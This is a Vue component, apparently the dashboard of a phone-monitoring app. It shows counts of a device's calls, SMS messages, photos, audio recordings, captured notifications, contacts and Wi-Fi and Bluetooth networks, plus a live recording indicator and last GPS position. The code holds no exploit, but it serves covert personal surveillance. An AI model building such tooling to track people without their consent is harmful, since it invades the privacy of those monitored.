<template>
  <div class="min-h-screen bg-gray-50 pb-20">
    <div class="bg-white px-4 py-3 border-b sticky top-0 z-10">
      <div class="flex items-center gap-2">
        <button @click="$router.back()" class="text-blue-500 text-sm">← 返回</button>
        <h1 class="text-lg font-bold">数据统计</h1>
      </div>
    </div>
    <div class="p-4 space-y-4">
      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">📊 今日概览</div>
        <div class="grid grid-cols-2 gap-3">
          <div class="bg-blue-50 rounded-lg p-3 text-center">
            <div class="text-xl font-bold text-blue-600">{{ stats.callsToday }}</div>
            <div class="text-xs text-gray-500">通话次数</div>
          </div>
          <div class="bg-green-50 rounded-lg p-3 text-center">
            <div class="text-xl font-bold text-green-600">{{ stats.smsToday }}</div>
            <div class="text-xs text-gray-500">短信条数</div>
          </div>
          <div class="bg-amber-50 rounded-lg p-3 text-center">
            <div class="text-xl font-bold text-amber-600">{{ stats.locationCount }}</div>
            <div class="text-xs text-gray-500">位置记录</div>
          </div>
          <div class="bg-red-50 rounded-lg p-3 text-center">
            <div class="text-xl font-bold text-red-600">{{ stats.alertToday }}</div>
            <div class="text-xs text-gray-500">今日告警</div>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">📱 设备状态</div>
        <div class="grid grid-cols-2 gap-3">
          <div class="flex items-center gap-2 p-2 bg-gray-50 rounded-lg">
            <span>📷</span>
            <div>
              <div class="text-sm font-medium">{{ stats.photoCount }}</div>
              <div class="text-xs text-gray-400">照片</div>
            </div>
          </div>
          <div class="flex items-center gap-2 p-2 bg-gray-50 rounded-lg">
            <span>🎵</span>
            <div>
              <div class="text-sm font-medium">{{ stats.audioCount }}</div>
              <div class="text-xs text-gray-400">录音</div>
            </div>
          </div>
          <div class="flex items-center gap-2 p-2 bg-gray-50 rounded-lg">
            <span>📡</span>
            <div>
              <div class="text-sm font-medium">{{ stats.bluetoothCount }}</div>
              <div class="text-xs text-gray-400">蓝牙设备</div>
            </div>
          </div>
          <div class="flex items-center gap-2 p-2 bg-gray-50 rounded-lg">
            <span>📶</span>
            <div>
              <div class="text-sm font-medium">{{ stats.wifiCount }}</div>
              <div class="text-xs text-gray-400">WiFi网络</div>
            </div>
          </div>
        </div>
      </div>

      <div class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">🔔 通知统计</div>
        <div class="flex justify-between items-center py-2">
          <span class="text-sm text-gray-600">捕获通知</span>
          <span class="font-medium">{{ stats.notificationCount }} 条</span>
        </div>
        <div class="flex justify-between items-center py-2 border-t border-gray-100">
          <span class="text-sm text-gray-600">联系人</span>
          <span class="font-medium">{{ stats.contactCount }} 个</span>
        </div>
        <div class="flex justify-between items-center py-2 border-t border-gray-100">
          <span class="text-sm text-gray-600">当前活动</span>
          <span class="font-medium">{{ stats.currentActivity || '未知' }}</span>
        </div>
        <div class="flex justify-between items-center py-2 border-t border-gray-100">
          <span class="text-sm text-gray-600">录音状态</span>
          <span :class="stats.isRecording ? 'text-red-500' : 'text-gray-500'" class="font-medium">
            {{ stats.isRecording ? '🔴 录音中' : '未录音' }}
          </span>
        </div>
      </div>

      <div v-if="stats.lastLocation" class="bg-white rounded-xl p-4 shadow-sm">
        <div class="font-medium mb-3">📍 最后位置</div>
        <div class="text-sm text-gray-600">
          纬度: {{ stats.lastLocation.latitude.toFixed(6) }}<br/>
          经度: {{ stats.lastLocation.longitude.toFixed(6) }}<br/>
          精度: {{ stats.lastLocation.accuracy }}米
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { api } from '../api/client'

const stats = ref<any>({
  callsToday: 0, smsToday: 0, locationCount: 0, alertToday: 0,
  photoCount: 0, audioCount: 0, bluetoothCount: 0, wifiCount: 0,
  notificationCount: 0, contactCount: 0, currentActivity: '', isRecording: false,
  lastLocation: null
})

onMounted(async () => {
  try {
    const res = await api.get('/api/stats/dashboard')
    stats.value = {
      callsToday: res.data.callsToday || 0,
      smsToday: res.data.smsToday || 0,
      locationCount: res.data.locationCount || 0,
      alertToday: res.data.alertToday || 0,
      photoCount: res.data.photoCount || 0,
      audioCount: res.data.audioRecordingCount || 0,
      bluetoothCount: res.data.bluetoothDeviceCount || 0,
      wifiCount: res.data.wifiNetworkCount || 0,
      notificationCount: res.data.notificationCount || 0,
      contactCount: res.data.contactCount || 0,
      currentActivity: res.data.currentActivity || '',
      isRecording: res.data.isRecording || false,
      lastLocation: res.data.lastLocation
    }
  } catch {}
})
</script>
